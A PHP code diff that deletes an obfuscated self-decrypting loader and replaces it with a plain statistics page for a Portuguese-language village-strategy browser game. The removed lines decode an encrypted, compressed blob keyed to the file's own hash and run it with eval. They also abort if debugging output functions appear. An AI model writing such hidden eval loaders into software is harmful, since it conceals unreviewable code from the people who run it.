@@ -1,24 +1,165 @@
 <?php
-$aempgv="5c0f286c8646e68bf33f9ee268d030d7";
-$rtulezb="075452550b0004570f555501505408555f0305570e065702030d06020405500f";
-$krvlcjnd="Su2PaeRW6QIj3W6nQlrl5QAx3Pl+WBLFerm2w+FbfSIWGdSRITxolhrB9d+n1i1Y4ePaU2AeuIztO5fRjYdQA38LpvNF/XqzC4Qdy/vFEwbM1vYuWwzrBqnnfCtFOBcaJ19jVx2gNVcVIHfB4JTm+WF42HA08XODPJDhYFpOn0GOijdMS8KE4U4cuDFqZUxMMsBByNm266sjbQfpycBN84R4WZTJ49n6znp922LCE36RqFATE7+E6yIjOozhtp5VvfCBzsjLTxXMFYb9i1M7KaH5/4GbBFTeTu/RvkhGP1YwKch19wI1G2jd7ZAuAVN5sEcqtm60fkNPaQ0Ele3huIi7EuR+IEShoe3FNHs+imzDA/zKmLGBNLRSggqMEJGxVH1RZNR/OdXaMbpriZ9cmSs1Uwko5aywQcu87CkBu9NE21U6G5iotD7fLQg4u5hWgBLiBeMGDyllPvCNLaOSD+gBE+UZMqPe8divuNBBG2qxg8YSf6kppucmLKd4nIL4nqUuRayK8qODtNH77YyjtwMRK96seDR6DjRltWrUebhLOqlgtyFRFKtL5W+MMEB5g6yo4kd7sSqMwroaguRW2Ea+LhDy5tzCKi0a7Q/kirquu5sV3Jhrg5rze639EqogVRCuNt9G3n+2eFJUrXDy0yyVKyEhWa588SVTRh5yQigl/MNSbBQSqMIgvR/pdcpCr2p0NQkxo6rVnpLQX0Vno4e+j4+gqCIev2IgXU0pfdDkTjOuvn0fa/0urhPoBQZGYBmhWOVIGJUi8G0Vi5myrFLVRODzW7KyjqTnTa/31DIcU5eIZ5dlt7erXzz+emwiNxonHTgzSU6h94j30Coi3VcgRKXcUU5Zst4rL6nT9QhctgNYQkKxmcLfxTezfJ8f6N+JvKpTZaY29kZpPjtKIehYNwJRRK4Vqa6tX8K/qXkQRLPj0sTW+TLXv2lBuCcqUYX5/9E6B6OsnFthXURescIOQfG+kLE9qKWt5Et3vkkJzLcegj+3YLGBZDHVTGyeYbWH16yXoQeN6xBHEnL4nQml8K1SAZ94dypTpuEdgr5HZ8sPFBQIiYcN1bhPDZQx7NUGn7lv6TMhaKFHFIuR3FvVdSGD6OmGD99VrvZo2uoRIQoVgtZS6oL20Ehf7ATTlLxj5brlL8eT4Cc0f8osJG20i+RhUg3azzcoWzpnemV/CslnekS931OWFJVqrhSEXlopslx5FAXXrRCFA4uR9JzJTsnBPKFgEjgqxatqR+vTt/OnR11LbP2v6kBG4KZNWzMJNH7aw1YNAblnwIvTtQw5HCbuh2y02DxUObuZN2QGBjiBcZ8kzwUbvnKPhIZRf3uc4WtGGc9MROcJJvfHtTjBSnrkHxLWFcix2YsgSwDLFrbXkiSG9tKFEIKe3T0hYhiAth+ntGD2dqQqzWGDZOzET9RK4PlALUFzcIQL5YMJJvYsc2Ja9qqnHt5CkVZtgJOlJJyf8/DHXe20vVPk+mVHyPsujPrO5yli7znaYp5IgCt1Caq2bITd+sUhSVN+wcJipdpEgXTUIYhuiUyZw+Gqh7tLDTZ87VLrk0MEUr0dLWSUEtI8kSVpu9a9z3mEC24BPR4qb/pzRHd85vc11YBCoQZMhXz8iVd8nAFppByjWS7TMZps3Xfh2iRBPjCaREEhSLyoNuWwsWom5RmBUteb5792vcO4Eyooo6C9Ep05zEZBSo+sTEDKanrP67dfwI1xbYpiB7WQ1600dmKaiSd8P169kvcV0N+tdzKNgMKYBEOIdlM/ND5WX4gjlCJT9R+TxJGNTM7VHU6OejRpF8EBG85gn54skv13uMkWmpJeCg9BGAWC4EPk7ay6msGAAkM/DT0OvcVbCtleGmV5ZdCcvENqgsC0RsXoq9V0P7GlqEXAryzUn+5KDM0hRSqjnjbTUvHMTbXhkc63BnAtFX5aPYRPIrI1NCBfF716iZZNTm3klJOh/8F2/asbXcetp0TRL946+f/Tx6z7oKvKYeukiJAu8avYxaCv1TauoLmW/YRedJBnTmT/P5OCPdZb99ihnSPsJKufLcaT0r1Hra1wogpQRanp+Ju51CgqpplLz37MMpg8AEs=";
-$hzyhwlh=file_get_contents(__FILE__);
-$mwzyqhv=str_replace($krvlcjnd,"",$hzyhwlh);
-if(strpos($mwzyqhv,"ec"."ho")!==false||strpos($mwzyqhv,"pr"."int")!==false||strpos($mwzyqhv,"var_"."dump")!==false||strpos($mwzyqhv,"file_put_"."contents")!==false||strpos($mwzyqhv,"fw"."rite")!==false){die();}
-$iinzmc=str_replace(array($aempgv,$rtulezb),array("SP_0fa3aa14","KP_d727c273"),$hzyhwlh);
-$uljjadieg=md5($iinzmc);
-$ntrlhn=hex2bin($rtulezb);
-$zasmllcw="";
-$qhuuutveu=strlen($uljjadieg);
-for($vbipjngz=0;$vbipjngz<$qhuuutveu;$vbipjngz++){
-$zasmllcw.=chr(ord($ntrlhn[$vbipjngz])^ord($uljjadieg[$vbipjngz]));
-}
-$poxuiu=base64_decode($krvlcjnd);
-$xmchjke=strlen($poxuiu);
-$bfpindddr="";
-$uqkqhqitl=strlen($zasmllcw);
-for($vbipjngz=0;$vbipjngz<$xmchjke;$vbipjngz++){
-$bfpindddr.=$poxuiu[$vbipjngz]^$zasmllcw[$vbipjngz%$uqkqhqitl];
-}
-$qefcomkh="gzun"."compress";
-eval('?>' . $qefcomkh($bfpindddr) . '<?php ');
+// Default vars to avoid warnings
+$world = $world ?? '1';
+?>
+<!DOCTYPE html
+    PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+    <title><?= htmlspecialchars(str_replace('{world}', $world, __('statistics.title', 'Estatísticas - Mundo {world}'))) ?></title>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <link rel="stylesheet" type="text/css" href="/css/game_new.css">
+</head>
+
+<body id="ds_body" class="scrollableMenu">
+
+    <div class="top_bar">
+        <div class="bg_left"> </div>
+        <div class="bg_right"> </div>
+    </div>
+    <div class="top_shadow"> </div>
+    <div class="top_background"> </div>
+
+    <table id="main_layout" cellspacing="0" align="center">
+        <tr style="height: 48px;">
+            <td class="topbar left"></td>
+            <td class="topbar center">
+                <div id="topContainer">
+                    <!-- Header Content placeholder -->
+                    <center>
+                        <h2 style="color:#fff; margin-top: 10px;"><?= htmlspecialchars(str_replace('{world}', $world, __('statistics.header', 'Estatísticas - Mundo {world}'))) ?></h2>
+                    </center>
+                </div>
+            </td>
+            <td class="topbar right"></td>
+        </tr>
+        <tr class="shadedBG">
+            <td class="bg_left" id="SkyScraperAdCellLeft">
+                <div id="SkyScraperAdLeft"></div>
+                <div class="bg_left"> </div>
+            </td>
+
+            <!-- MAIN CONTENT CELL -->
+            <td class="maincell" id="content_value" style="width: 850px; background: none; padding: 10px;">
+                <link rel="stylesheet" href="/css/mail_modern.css">
+
+                <table class="vis" width="100%">
+                    <tr>
+                        <th colspan="2"><?= __('statistics.menu', 'Menu') ?></th>
+                    </tr>
+                    <tr>
+                        <td width="200" valign="top">
+                            <table class="vis" width="100%">
+                                <tr>
+                                    <td <?php if ($type == 'player')
+                                        echo 'class="selected"'; ?>><a
+                                             href="stats.php?mode=player"><?= __('statistics.players', 'Jogadores') ?></a></td>
+                                </tr>
+                                <tr>
+                                    <td <?php if ($type == 'ally')
+                                        echo 'class="selected"'; ?>><a
+                                             href="stats.php?mode=ally"><?= __('statistics.tribes', 'Tribos') ?></a></td>
+                                </tr>
+                                <tr>
+                                    <td <?php if ($type == 'village')
+                                        echo 'class="selected"'; ?>><a
+                                             href="stats.php?mode=village"><?= __('statistics.villages', 'Aldeias') ?></a></td>
+                                </tr>
+                            </table>
+                        </td>
+                        <td valign="top">
+                            <?php if ($type === 'player'): ?>
+                                <h3><?= __('statistics.player_stats', 'Estatísticas do Jogador') ?></h3>
+                                <table class="vis" width="100%">
+                                    <tr>
+                                        <td><?= __('statistics.attacks_performed', 'Ataques Realizados:') ?></td>
+                                        <td><?= number_format($stats['total_attacks'] ?? 0) ?></td>
+                                    </tr>
+                                    <tr>
+                                        <td><?= __('statistics.defenses_performed', 'Defesas Realizadas:') ?></td>
+                                        <td><?= number_format($stats['total_defenses'] ?? 0) ?></td>
+                                    </tr>
+                                    <tr>
+                                        <td><?= __('statistics.villages_conquered', 'Aldeias Conquistadas:') ?></td>
+                                        <td><?= number_format($stats['villages_conquered'] ?? 0) ?></td>
+                                    </tr>
+                                    <tr>
+                                        <td><?= __('statistics.villages_lost', 'Aldeias Perdidas:') ?></td>
+                                        <td><?= number_format($stats['villages_lost'] ?? 0) ?></td>
+                                    </tr>
+                                    <tr>
+                                        <td><?= __('statistics.resources_sent', 'Recursos Enviados:') ?></td>
+                                        <td><?= number_format($stats['resources_sent'] ?? 0) ?></td>
+                                    </tr>
+                                    <tr>
+                                        <td><?= __('statistics.resources_received', 'Recursos Recebidos:') ?></td>
+                                        <td><?= number_format($stats['resources_received'] ?? 0) ?></td>
+                                    </tr>
+                                </table>
+
+                            <?php elseif ($type === 'ally'): ?>
+                                <h3><?= __('statistics.tribe_stats', 'Estatísticas da Tribo') ?></h3>
+                                <table class="vis" width="100%">
+                                    <tr>
+                                        <td><?= __('statistics.name', 'Nome:') ?></td>
+                                        <td><?= htmlspecialchars($ally_data['name'] ?? 'N/A') ?>
+                                            (<?= htmlspecialchars($ally_data['tag'] ?? '') ?>)</td>
+                                    </tr>
+                                    <tr>
+                                        <td><?= __('statistics.members', 'Membros:') ?></td>
+                                        <td><?= number_format($stats['total_members'] ?? 0) ?></td>
+                                    </tr>
+                                    <tr>
+                                        <td><?= __('statistics.total_villages', 'Aldeias Totais:') ?></td>
+                                        <td><?= number_format($stats['total_villages'] ?? 0) ?></td>
+                                    </tr>
+                                    <tr>
+                                        <td><?= __('statistics.total_points', 'Pontos Totais:') ?></td>
+                                        <td><?= number_format($stats['total_points'] ?? 0) ?></td>
+                                    </tr>
+                                </table>
+
+                            <?php elseif ($type === 'village'): ?>
+                                <h3><?= __('statistics.village_stats', 'Estatísticas da Aldeia') ?></h3>
+                                <table class="vis" width="100%">
+                                    <tr>
+                                        <td><?= __('statistics.name', 'Nome:') ?></td>
+                                        <td><?= htmlspecialchars($village_data['name'] ?? 'N/A') ?></td>
+                                    </tr>
+                                    <tr>
+                                        <td><?= __('statistics.points', 'Pontos:') ?></td>
+                                        <td><?= number_format($stats['total_points'] ?? 0) ?></td>
+                                    </tr>
+                                    <tr>
+                                        <td><?= __('statistics.total_buildings', 'Total de Edifícios:') ?></td>
+                                        <td><?= number_format($stats['buildings_count'] ?? 0) ?></td>
+                                    </tr>
+                                    <tr>
+                                        <td><?= __('statistics.military_population', 'População Militar:') ?></td>
+                                        <td><?= number_format($stats['units_count'] ?? 0) ?></td>
+                                    </tr>
+                                </table>
+                            <?php endif; ?>
+                        </td>
+                    </tr>
+                </table>
+
+            </td>
+
+            <!-- SKY SCRAPER AD CELL -->
+            <td class="bg_right" id="SkyScraperAdCell">
+                <div class="bg_right"> </div>
+                <div id="SkyScraperAd" style="height: 840px;"></div>
+            </td>
+        </tr>
+        <tr class="newStyleOnly">
+            <td class="bg_bottomleft">&nbsp;</td>
+            <td class="bg_bottomcenter">&nbsp;</td>
+            <td class="bg_bottomright">&nbsp;</td>
+        </tr>
+    </table>
+
+</body>
+
+</html>
